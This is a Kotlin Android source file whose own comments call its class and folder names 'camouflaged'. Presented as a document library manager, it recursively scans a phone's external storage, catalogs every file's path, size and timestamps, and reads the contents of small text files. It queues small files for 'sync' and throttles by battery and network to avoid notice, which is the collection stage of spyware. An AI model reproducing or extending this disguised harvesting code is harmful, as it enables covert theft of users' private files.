package com.example.kem

import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import android.os.StatFs
import android.os.BatteryManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import androidx.core.content.ContextCompat
import android.Manifest
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*
import kotlin.collections.ArrayDeque

// ==================== SMART RESOURCE MONITOR ====================
/**
 * مراقب الموارد الذكي
 * Smart resource monitor for battery and network optimization
 */
object SmartResourceMonitor {
    
    fun getBatteryLevel(context: Context): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }
    
    fun isLowBattery(context: Context): Boolean {
        return getBatteryLevel(context) < 20
    }
    
    fun isCharging(context: Context): Boolean {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.isCharging
    }
    
    fun getNetworkType(context: Context): String {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return "none"
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "none"
        
        return when {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
            else -> "unknown"
        }
    }
    
    fun shouldLimitOperations(context: Context): Boolean {
        return isLowBattery(context) && !isCharging(context)
    }
    
    fun getOptimalBatchSize(context: Context): Int {
        val networkType = getNetworkType(context)
        val batteryLevel = getBatteryLevel(context)
        
        return when {
            networkType == "wifi" && batteryLevel > 50 -> 20
            networkType == "wifi" && batteryLevel > 20 -> 10
            networkType == "cellular" && batteryLevel > 50 -> 5
            networkType == "cellular" && batteryLevel > 20 -> 3
            else -> 1
        }
    }
}

// ==================== DOCUMENT LIBRARY CONSTANTS ====================
/**
 * ثوابت مكتبة المستندات المموهة
 * Camouflaged document library constants
 */
object DocumentLibraryConstants {
    const val LOG_TAG = "DocumentLibrarian"
    
    // حدود ذكية - Smart limits
    const val MAX_LIBRARY_SCAN_SIZE = 1000
    const val PREVIEW_CONTENT_LENGTH = 500
    const val BATCH_CATALOG_SIZE = 10
    const val CONTENT_SAMPLE_SIZE = 2048 // 2KB sample
    const val SYNC_QUEUE_LIMIT = 50
    
    // أنواع المحتوى المموهة - Camouflaged content types
    val ACADEMIC_FORMATS = setOf("pdf", "doc", "docx", "txt", "rtf")
    val VISUAL_CONTENT = setOf("jpg", "jpeg", "png", "gif", "bmp", "webp")
    val AUDIO_LIBRARY = setOf("mp3", "wav", "aac", "m4a", "ogg", "flac")
    val DATA_ARCHIVES = setOf("zip", "rar", "7z", "tar", "gz")
    val SYSTEM_RESOURCES = setOf("apk", "dex", "so", "db", "sqlite")
    
    // مجلدات مموهة - Camouflaged folder names
    val LIBRARY_SECTIONS = mapOf(
        "academic" to "Academic Documents",
        "visual" to "Visual Content Library",
        "audio" to "Audio Collections",
        "archives" to "Data Archives",
        "system" to "System Resources",
        "personal" to "Personal Files"
    )
    
    fun classifyContent(fileName: String): String {
        val extension = fileName.substringAfterLast('.', "").lowercase()
        return when {
            extension in ACADEMIC_FORMATS -> "academic"
            extension in VISUAL_CONTENT -> "visual"
            extension in AUDIO_LIBRARY -> "audio"
            extension in DATA_ARCHIVES -> "archives"
            extension in SYSTEM_RESOURCES -> "system"
            else -> "personal"
        }
    }
}

// ==================== INTELLIGENT SYNC QUEUE ====================
/**
 * طابور المزامنة الذكي
 * Intelligent synchronization queue
 */
class IntelligentSyncQueue(private val context: Context) {
    
    private val syncQueue = ArrayDeque<SyncTask>()
    private val priorityQueue = ArrayDeque<SyncTask>()
    private var isProcessing = false
    
    data class SyncTask(
        val filePath: String,
        val contentType: String,
        val priority: Int,
        val sizeBytes: Long,
        val createdAt: Long = System.currentTimeMillis()
    )
    
    fun addTask(filePath: String, contentType: String, priority: Int = 1) {
        val file = File(filePath)
        if (!file.exists()) return
        
        val task = SyncTask(filePath, contentType, priority, file.length())
        
        if (priority > 5) {
            priorityQueue.addLast(task)
        } else {
            syncQueue.addLast(task)
        }
        
        // تنظيف المهام القديمة
        cleanOldTasks()
    }
    
    private fun cleanOldTasks() {
        val cutoffTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000) // 24 hours
        syncQueue.removeAll { it.createdAt < cutoffTime }
        priorityQueue.removeAll { it.createdAt < cutoffTime }
    }
    
    suspend fun processQueue(onProgress: (String) -> Unit): List<JSONObject> {
        if (isProcessing) return emptyList()
        isProcessing = true
        
        val results = mutableListOf<JSONObject>()
        
        try {
            // معالجة المهام عالية الأولوية أولاً
            while (priorityQueue.isNotEmpty() && !SmartResourceMonitor.shouldLimitOperations(context)) {
                val task = priorityQueue.removeFirst()
                processTask(task, onProgress)?.let { results.add(it) }
                delay(100) // تنفس صغير للنظام
            }
            
            // معالجة المهام العادية
            val batchSize = SmartResourceMonitor.getOptimalBatchSize(context)
            var processed = 0
            
            while (syncQueue.isNotEmpty() && processed < batchSize && !SmartResourceMonitor.shouldLimitOperations(context)) {
                val task = syncQueue.removeFirst()
                processTask(task, onProgress)?.let { results.add(it) }
                processed++
                delay(50)
            }
            
        } finally {
            isProcessing = false
        }
        
        return results
    }
    
    private suspend fun processTask(task: SyncTask, onProgress: (String) -> Unit): JSONObject? {
        return try {
            onProgress("Processing ${task.contentType} content...")
            
            // تأكد من أن الملف ما زال موجوداً
            val file = File(task.filePath)
            if (!file.exists()) return null
            
            // تحليل المحتوى حسب النوع
            when (task.contentType) {
                "academic" -> analyzeAcademicDocument(file)
                "visual" -> analyzeVisualContent(file)
                "audio" -> analyzeAudioContent(file)
                else -> analyzeGeneralContent(file)
            }
        } catch (e: Exception) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Error processing task: ${task.filePath}", e)
            null
        }
    }
    
    private fun analyzeAcademicDocument(file: File): JSONObject {
        return JSONObject().apply {
            put("document_id", file.name)
            put("content_type", "academic_document")
            put("file_size", file.length())
            put("last_modified", file.lastModified())
            put("location_path", file.parent)
            put("preview_available", file.extension.lowercase() == "txt")
            
            // معاينة محتوى محدودة للملفات النصية
            if (file.extension.lowercase() == "txt" && file.length() < DocumentLibraryConstants.CONTENT_SAMPLE_SIZE) {
                try {
                    val preview = BaseUtils.sanitizeText(file.readText(), DocumentLibraryConstants.PREVIEW_CONTENT_LENGTH)
                    put("content_preview", preview)
                } catch (e: Exception) {
                    put("content_preview", "Preview not available")
                }
            }
        }
    }
    
    private fun analyzeVisualContent(file: File): JSONObject {
        return JSONObject().apply {
            put("media_id", file.name)
            put("content_type", "visual_content")
            put("file_size", file.length())
            put("creation_date", file.lastModified())
            put("storage_location", file.parent)
            put("format", file.extension.lowercase())
            put("thumbnail_available", false) // لتجنب معالجة الصور
        }
    }
    
    private fun analyzeAudioContent(file: File): JSONObject {
        return JSONObject().apply {
            put("audio_id", file.name)
            put("content_type", "audio_content")
            put("file_size", file.length())
            put("duration_estimated", estimateAudioDuration(file))
            put("storage_path", file.parent)
            put("format", file.extension.lowercase())
        }
    }
    
    private fun analyzeGeneralContent(file: File): JSONObject {
        return JSONObject().apply {
            put("item_id", file.name)
            put("content_type", "general_content")
            put("size_bytes", file.length())
            put("modification_time", file.lastModified())
            put("directory_path", file.parent)
            put("file_type", file.extension.lowercase())
        }
    }
    
    private fun estimateAudioDuration(file: File): Long {
        // تقدير تقريبي للمدة (ثواني) بناءً على الحجم
        // متوسط bit rate ~128 kbps = 16 KB/s
        return file.length() / 16000
    }
    
    fun getQueueStatus(): JSONObject {
        return JSONObject().apply {
            put("priority_tasks", priorityQueue.size)
            put("regular_tasks", syncQueue.size)
            put("is_processing", isProcessing)
            put("total_pending", priorityQueue.size + syncQueue.size)
        }
    }
}

// ==================== DOCUMENT LIBRARIAN ====================
/**
 * أمين المكتبة الرقمية - المدير الرئيسي للمحتوى
 * Digital librarian - Main content manager
 */
class DocumentLibrarian(context: Context) : BaseDataProcessor(context) {
    
    private val syncQueue = IntelligentSyncQueue(context)
    
    fun hasLibraryAccess(): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) ||
               BaseUtils.checkPermission(context, Manifest.permission.MANAGE_EXTERNAL_STORAGE)
    }
    
    fun catalogLibraryContent(targetPath: String? = null): JSONObject {
        return safeExecute("library cataloging") {
            if (!hasLibraryAccess()) {
                Log.w(DocumentLibraryConstants.LOG_TAG, "Library access permission not granted")
                return@safeExecute BaseUtils.createErrorResponse("permission_denied", "Access to document library denied")
            }
            
            val libraryStructure = scanLibraryStructure(targetPath)
            val contentStatistics = generateLibraryStatistics(libraryStructure)
            val systemResources = analyzeSystemResources()
            
            createSuccessResponse(
                JSONObject().apply {
                    put("library_structure", libraryStructure)
                    put("content_statistics", contentStatistics)
                    put("system_analysis", systemResources)
                    put("sync_queue_status", syncQueue.getQueueStatus())
                },
                libraryStructure.optJSONArray("content_catalog")?.length() ?: 0
            ).apply {
                put("cataloging_timestamp", System.currentTimeMillis())
                put("battery_level", SmartResourceMonitor.getBatteryLevel(context))
                put("network_type", SmartResourceMonitor.getNetworkType(context))
                Log.i(DocumentLibraryConstants.LOG_TAG, "Library cataloging completed")
            }
        }
    }
    
    private fun scanLibraryStructure(targetPath: String?): JSONObject {
        val libraryData = JSONObject()
        val contentCatalog = JSONArray()
        
        try {
            val rootPath = targetPath ?: Environment.getExternalStorageDirectory().absolutePath
            val rootDirectory = File(rootPath)
            
            if (!rootDirectory.exists() || !rootDirectory.canRead()) {
                Log.w(DocumentLibraryConstants.LOG_TAG, "Cannot access directory: $rootPath")
                libraryData.put("content_catalog", contentCatalog)
                return libraryData
            }
            
            val batchSize = SmartResourceMonitor.getOptimalBatchSize(context)
            var scannedCount = 0
            
            scanDirectoryRecursively(rootDirectory, contentCatalog, batchSize) { count ->
                scannedCount = count
                scannedCount < DocumentLibraryConstants.MAX_LIBRARY_SCAN_SIZE && 
                !SmartResourceMonitor.shouldLimitOperations(context)
            }
            
            libraryData.put("content_catalog", contentCatalog)
            libraryData.put("root_path", rootPath)
            libraryData.put("scanned_items", scannedCount)
            libraryData.put("scan_limited", scannedCount >= DocumentLibraryConstants.MAX_LIBRARY_SCAN_SIZE)
            
        } catch (e: Exception) {
            Log.e(DocumentLibraryConstants.LOG_TAG, "Error scanning library structure", e)
            libraryData.put("content_catalog", contentCatalog)
            libraryData.put("scan_error", e.message)
        }
        
        return libraryData
    }
    
    private fun scanDirectoryRecursively(
        directory: File, 
        catalog: JSONArray, 
        maxItems: Int,
        shouldContinue: (Int) -> Boolean
    ) {
        try {
            val items = directory.listFiles() ?: return
            
            for (item in items) {
                if (!shouldContinue(catalog.length())) break
                
                try {
                    if (item.isDirectory) {
                        // فهرسة المجلد
                        val folderInfo = JSONObject().apply {
                            put("item_name", item.name)
                            put("item_type", "directory")
                            put("location_path", item.absolutePath)
                            put("items_count", item.listFiles()?.size ?: 0)
                            put("last_modified", BaseUtils.formatTimestamp(item.lastModified()))
                            put("size_estimation", calculateDirectorySize(item, 100)) // عينة محدودة
                        }
                        catalog.put(folderInfo)
                        
                        // مسح المجلدات الفرعية (مع حد أقصى للعمق)
                        if (catalog.length() < maxItems) {
                            scanDirectoryRecursively(item, catalog, maxItems, shouldContinue)
                        }
                    } else {
                        // فهرسة الملف
                        val contentType = DocumentLibraryConstants.classifyContent(item.name)
                        val fileInfo = JSONObject().apply {
                            put("item_name", item.name)
                            put("item_type", "file")
                            put("content_classification", DocumentLibraryConstants.LIBRARY_SECTIONS[contentType])
                            put("file_size", item.length())
                            put("location_path", item.absolutePath)
                            put("last_modified", BaseUtils.formatTimestamp(item.lastModified()))
                            put("extension", item.extension.lowercase())
                            put("readable", item.canRead())
                        }
                        catalog.put(fileInfo)
                        
                        // إضافة للطابور للمعالجة اللاحقة
                        if (item.length() < DocumentLibraryConstants.CONTENT_SAMPLE_SIZE * 10) { // فقط الملفات الصغيرة
                            syncQueue.addTask(item.absolutePath, contentType)
                        }
                    }
                } catch (e: Exception) {
                    Log.w(DocumentLibraryConstants.LOG_TAG, "Error processing item: ${item.name}", e)
                }
            }
        } catch (e: SecurityException) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Access denied to directory: ${directory.absolutePath}")
        }
    }
    
    private fun calculateDirectorySize(directory: File, maxFiles: Int): Long {
        var size = 0L
        var fileCount = 0
        
        try {
            directory.listFiles()?.forEach { file ->
                if (fileCount >= maxFiles) return@forEach
                if (file.isFile) {
                    size += file.length()
                    fileCount++
                }
            }
        } catch (e: Exception) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Error calculating directory size", e)
        }
        
        return size
    }
    
    private fun generateLibraryStatistics(libraryStructure: JSONObject): JSONObject {
        val stats = JSONObject()
        
        try {
            val catalog = libraryStructure.optJSONArray("content_catalog") ?: JSONArray()
            val typeCount = mutableMapOf<String, Int>()
            val sizeByType = mutableMapOf<String, Long>()
            var totalSize = 0L
            var fileCount = 0
            var dirCount = 0
            
            for (i in 0 until catalog.length()) {
                val item = catalog.getJSONObject(i)
                val itemType = item.optString("item_type")
                
                if (itemType == "file") {
                    fileCount++
                    val classification = item.optString("content_classification", "Other")
                    val size = item.optLong("file_size", 0)
                    
                    typeCount[classification] = typeCount.getOrDefault(classification, 0) + 1
                    sizeByType[classification] = sizeByType.getOrDefault(classification, 0) + size
                    totalSize += size
                } else if (itemType == "directory") {
                    dirCount++
                }
            }
            
            stats.put("total_files", fileCount)
            stats.put("total_directories", dirCount)
            stats.put("total_size_bytes", totalSize)
            stats.put("size_formatted", formatFileSize(totalSize))
            stats.put("files_by_type", JSONObject(typeCount.mapKeys { it.key }))
            stats.put("size_by_type", JSONObject(sizeByType.mapKeys { it.key }))
            stats.put("battery_level", SmartResourceMonitor.getBatteryLevel(context))
            stats.put("available_space", getAvailableSpace())
            
        } catch (e: Exception) {
            Log.e(DocumentLibraryConstants.LOG_TAG, "Error generating statistics", e)
        }
        
        return stats
    }
    
    private fun analyzeSystemResources(): JSONObject {
        return JSONObject().apply {
            try {
                put("battery_level", SmartResourceMonitor.getBatteryLevel(context))
                put("is_charging", SmartResourceMonitor.isCharging(context))
                put("network_type", SmartResourceMonitor.getNetworkType(context))
                put("available_storage", formatFileSize(getAvailableSpace()))
                put("optimization_active", SmartResourceMonitor.shouldLimitOperations(context))
                put("recommended_batch_size", SmartResourceMonitor.getOptimalBatchSize(context))
            } catch (e: Exception) {
                put("analysis_error", e.message)
            }
        }
    }
    
    private fun getAvailableSpace(): Long {
        return try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            stat.availableBlocksLong * stat.blockSizeLong
        } catch (e: Exception) {
            0L
        }
    }
    
    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> "%.1f GB".format(bytes / (1024.0 * 1024.0 * 1024.0))
            bytes >= 1024 * 1024 -> "%.1f MB".format(bytes / (1024.0 * 1024.0))
            bytes >= 1024 -> "%.1f KB".format(bytes / 1024.0)
            else -> "$bytes B"
        }
    }
    
    suspend fun processContentQueue(onProgress: (String) -> Unit): JSONObject {
        return try {
            val processedItems = syncQueue.processQueue(onProgress)
            JSONObject().apply {
                put("status", "success")
                put("processed_count", processedItems.size)
                put("processed_items", JSONArray(processedItems))
                put("queue_status", syncQueue.getQueueStatus())
                put("processing_timestamp", System.currentTimeMillis())
            }
        } catch (e: Exception) {
            Log.e(DocumentLibraryConstants.LOG_TAG, "Error processing content queue", e)
            BaseUtils.createErrorResponse("processing_error", "Failed to process content queue")
        }
    }
    
    fun analyzeSpecificContent(filePath: String): JSONObject {
        return safeExecute("specific content analysis") {
            val file = File(filePath)
            if (!file.exists() || !file.canRead()) {
                return@safeExecute BaseUtils.createErrorResponse("file_not_accessible", "Cannot access specified content")
            }
            
            val contentType = DocumentLibraryConstants.classifyContent(file.name)
            val analysis = JSONObject().apply {
                put("file_path", filePath)
                put("file_name", file.name)
                put("content_type", contentType)
                put("content_classification", DocumentLibraryConstants.LIBRARY_SECTIONS[contentType])
                put("file_size", file.length())
                put("last_modified", BaseUtils.formatTimestamp(file.lastModified()))
                put("readable", file.canRead())
                put("extension", file.extension.lowercase())
                
                // تحليل محتوى محدود للملفات النصية الصغيرة
                if (contentType == "academic" && file.extension.lowercase() == "txt" && 
                    file.length() < DocumentLibraryConstants.CONTENT_SAMPLE_SIZE) {
                    try {
                        val content = BaseUtils.sanitizeText(file.readText(), DocumentLibraryConstants.PREVIEW_CONTENT_LENGTH)
                        put("content_sample", content)
                        put("word_count", content.split("\\s+".toRegex()).size)
                    } catch (e: Exception) {
                        put("content_sample", "Content preview not available")
                    }
                }
            }
            
            createSuccessResponse(analysis, 1)
        }
    }
}